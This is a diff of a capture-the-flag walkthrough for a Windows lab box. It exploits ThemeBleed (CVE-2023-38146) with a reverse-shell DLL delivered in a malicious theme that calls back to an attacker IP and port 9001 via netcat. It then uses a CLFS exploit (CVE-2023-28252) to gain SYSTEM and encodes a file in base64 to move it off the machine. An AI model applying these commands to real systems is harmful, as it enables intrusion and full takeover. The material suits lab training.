@@ -34,16 +34,16 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Sep 21 08:37:08 2026 -- 1 IP address (1 host up) scanned in 64.08 seconds
 ```
 
-Port 80 -> Aero Theme Hub: a Windows theme repo with an upload form that only accepts `.theme` / `.themepack`.
+Port 80 hosts Aero Theme Hub — a Windows theme repo with an upload form that only accepts `.theme` / `.themepack`.
 
 # User
 ## Binary Exploitation
 
-- The box is Windows, so look into **windows theme exploitation**:
+The box is Windows, so look into **windows theme exploitation**:
 
 > https://www.quorumcyber.com/threat-intelligence/windows-11-themebleed-remote-code-execution-vulnerability/
 
-- Which leads to an article about **RCE** known as **ThemeBleed**
+Which leads to an article about **RCE** known as **ThemeBleed**
 
 ---
 
@@ -56,23 +56,16 @@ Requirements - For traditional method (Manual):
 ---
 ### Method that didn't work - Traditional method (Requires Windows OS)
 
-- Open visual studio in windows
-- Create a new project -> Dynamic-Link Library(DLL)
-- On Source Explorer (if not there, access it from view tab)
-	- Source Files -> Add -> New Item -> select C++ File(.cpp)
-	- name the file as rev.cpp
-- On source explorer
-	- Header Files -> Add -> New Item -> Select Header Files(.h)
-	- name the file as rev.h
+Open visual studio in windows and create a new project -> Dynamic-Link Library(DLL). On Source Explorer (if not there, access it from view tab), go to Source Files -> Add -> New Item -> select C++ File(.cpp) and name the file as rev.cpp. Then on source explorer, go to Header Files -> Add -> New Item -> Select Header Files(.h) and name the file as rev.h.
 
-In rev.h use the code to call the function which is mentioned in the POC:
+In rev.h, use the code to call the function which is mentioned in the POC:
 
 ```c++
 #pragma once
 extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
 ```
 
-In rev.cpp use the reverse shell written in C which we got from:
+In rev.cpp, use the reverse shell written in C which we got from:
 
 > reference : https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c
 
@@ -155,8 +148,7 @@ Navigate to `dllmain.cpp` and compile it — once it returns zero errors, build 
 
 Now navigate to the solution `C:\Users\Dante\source\repo\Dll1\x64\Release\` and rename the **dll** as **stage_3**, then copy the stage_3 over the file stage_3 present in the **data** directory of the **ThemeBleed exploit directory**.
 
-The exploit uses the smb server, so go to the START menu:
-- Services -> smb server -> options -> disable
+The exploit uses the smb server, so go to the START menu: Services -> smb server -> options -> disable.
 
 Set a **netcat** listener for the **port** you mentioned in the reverse shell script:
 
@@ -176,7 +168,7 @@ Now set up a server (smb server):
 ps > ./themebleed.exe server
 ```
 
-- It will verbose the output `server started`
+It will verbose the output `server started`.
 
 Upload the theme on the site and the exploit will be executed.
 
@@ -187,8 +179,7 @@ The server runs through stage_1, stage_2, stage_3 — and when it executes stage
 
 > https://github.com/jnnshschl/CVE-2023-38146
 
-- This CVE uses a python script to create a malicious dll, add it to stage_3, and create a windows theme exploit
-- It also uses the smb server
+This CVE uses a python script to create a malicious dll, add it to stage_3, and create a windows theme exploit — it also uses the smb server.
 
 ```sh
 python3 themebleed.py -r 10.10.16.82 -p 9001
@@ -200,21 +191,19 @@ Three stages execute — and when the final stage runs, we gain a shell as a use
 rlwarp -cAr nc -lvnp 9001
 ```
 
-Gained shell `sam.emerson`
+Gained a shell `sam.emerson`
 
 # Root
 
 We got a file `CVE-2023-28252_Summary.pdf` in the Documents directory of the user.
 
-- We can't transfer it with `impacket-smbserver` because we're already connected using **smbserver** on `445`
-
-We can transfer the file by encoding it in base64:
+We can't transfer it with `impacket-smbserver` because we're already connected using **smbserver** on `445`. We can transfer the file by encoding it in base64:
 
 ```powershell
 [convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
 ```
 
-Copy the code and decode it on the linux machine:
+Copy the output and decode it on the linux machine:
 
 ```sh
 cat CVE-2023-28252_Summary.b64 | base64 -d > CVE-2023-28252_Summary.pdf
@@ -226,7 +215,7 @@ Now we can read the pdf:
 CVE-2023-28252 Summary: Vulnerability Type: Privilege Escalation Target Component: Common Log File System (CLFS) Risk Level: Critical Exploitation Date: February 2022 onwards Patch Released by Microsoft: April 2023 Background: The Nokoyawa ransomware group has been active since February 2022, and it was only in April 2023 that Microsoft released a patch to address this issue. This vulnerability has been used as a means for attackers to gain unauthorized access to Windows systems, making it imperative for us to apply the necessary patch to safeguard our infrastructure. According to Kaspersky’s analysis, the Nokoyawa ransomware group has used other exploits targeting the CLFS driver since June 2022, with similar but distinct characteristics, all linked to a single exploit developer. Actions Required: Immediate Patching: We strongly recommend applying the security patch released by Microsoft for CVE-2023-28252 as soon as possible to mitigate the risk associated with this vulnerability. Failing to do so could leave our servers exposed to potential exploitation. Review and Monitoring: In addition to patching, we should conduct a thorough review of our server logs to check for any signs of suspicious activity or unauthorized access. Continuous monitoring of our server environment is crucial to ensure the security of our systems. Security Awareness: It is essential to remind all team members of the importance of practicing good cybersecurity hygiene. Encourage the use of strong, unique passwords and two-factor authentication wherever applicable. Incident Response Plan: Ensure that our incident response plan is up-to-date and ready for immediate activation in case of any security incidents. Timely detection and response are critical in mitigating the impact of potential attacks
 ```
 
-It states that the machine is vulnerable to **CVE-2023-28252** - PrivEsc.
+It states that the machine is vulnerable to **CVE-2023-28252** — a PrivEsc.
 
 First check whether the vulnerability is patched:
 
@@ -253,6 +242,7 @@ Upload the binary to the windows machine and execute it:
 ```powershell
 ps > ./clfs_eop.exe cmd.exe
 ```
-- It'll execute the payload as **system**
+
+It'll execute the payload as **system**.
 
 Gained `root`
